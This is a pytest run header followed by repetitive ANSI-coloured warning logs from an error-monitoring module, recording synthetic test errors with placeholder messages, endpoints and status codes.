============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794654Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2011'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2012'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794753Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2013'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794803Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2014'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794852Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2015'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794900Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2016'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794951Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2017'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794999Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2018'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795047Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2019'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795094Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2020'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2021'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795190Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2022'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795293Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2023'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795361Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2024'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2025'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795525Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2026'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795580Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2027'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2028'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2029'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2030'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2031'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2032'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2033'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795945Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2034'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2035'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796048Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2036'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2037'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
